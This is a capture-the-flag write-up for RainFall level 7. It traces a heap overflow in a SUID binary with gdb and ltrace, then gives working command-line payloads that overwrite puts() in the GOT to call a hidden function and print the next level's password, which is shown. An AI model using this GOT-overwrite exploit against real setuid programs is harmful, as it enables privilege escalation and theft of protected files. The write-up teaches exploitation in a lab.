# Level 7

## Vulnerability

Heap Overflow + Memory Corruption

## Context

We find a binary with owner level8 and SUID.
```
level7@RainFall:~$ ls -l
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```
It segfaults when run with 0 or 1 argument. It reponds to 2 or more arguments with "~".
```
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 anya
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 anya drew
~~
level7@RainFall:~$ ./level7 anya drew win
~~
```

## Solution

Let's explore the binary using gdb. 
We can see here that ```main()``` makes 2 calls to ```strcpy()```, and one call to each ```fopen()``` and ```fgets()```.
```strcpy()``` is unsafe in that it has no length parameter, which leaves it vulnerable to buffer overflows and consequent memory corruption. 
```
level7@RainFall:~$ gdb -q level7
(gdb) disas main
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
```
Let's take a deeper look at the ```fopen()``` and ```fgets()``` parameters.
It looks like it opens the file with the password we're looking for, and saves it in ```c```!
It then does nothing with ```c```.
```
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
```
Let's see if that's everything. 
We also find a function ```m()``` that is never called. 
This function prints ```time()``` and the variable ```c```!
```
(gdb) info function
All defined functions:
[...]
0x080484f4  m
[...]
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
```
Sooo the exploit here is to call ```m()``` by overwriting ```puts()``` in the GOT... and thus print ```c``` (and the password)!

Let's locate the addresses of ```m()``` and ```puts()```.
We can see the address of ```m()``` is 0x080484f4, and the address of ```puts@plt``` is 0x8048400.
But that's just a pointer to ```puts``` GOT address – which, upon closer inspection is 0x8049928.
```
(gdb) info function
All defined functions:
[...]
0x08048400  puts@plt
0x080484f4  m
[...]
(gdb) x/i 0x8048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
```
Next, let's work out our payload. 
We'll use this [buffer overflow EIP offset string generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to work out which offset is being overwritten. 
```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff744, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
It looks like the program segfaults at 0x37614136, and if we plug that into our handy link above, we find the offset is 20. 

Here is what our string attack should look like:
- pad of arbitrary data [20 bytes]
- puts() GOT address [4 bytes]
- address of m() [4 bytes]
Let's visualize that. 
```
"paddings [20 bytes] + GOT address of puts" + "address of m()"
                  argv[1]                          argv[2]
```
Let's try it out!
```
level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1611061949
```

## Recreate Exploited Binary

As user ```level8```, in ```/tmp```, create and compile ```level7_source.c```
```
level8@RainFall:~$ cd /tmp
level8@RainFall:/tmp$ gcc level7_source.c -o level7_source
```

Edit permissions including suid, then move the binary to home directory.
```
level8@RainFall:/tmp$ chmod u+s level7_source
level8@RainFall:/tmp$ chmod +wx ~; mv level7_source ~
```

Exit back to user ```level7```, then run the binary. <br/>
Notes: 
- Our new address for ```m()``` is located at 0x08048514 (but we still print the address in little endian).
- Our new address for ```puts()``` is located at 0x8048420 => 0x0804a014 (in the GOT)
```
level8@RainFall:/tmp$ exit
exit
level7@RainFall:~$ /home/user/level8/level7_source `python -c 'print "a" * 20 + "\x14\xa0\x04\x08"'` `python -c 'print "\x14\x85\x04\x08"'`
```
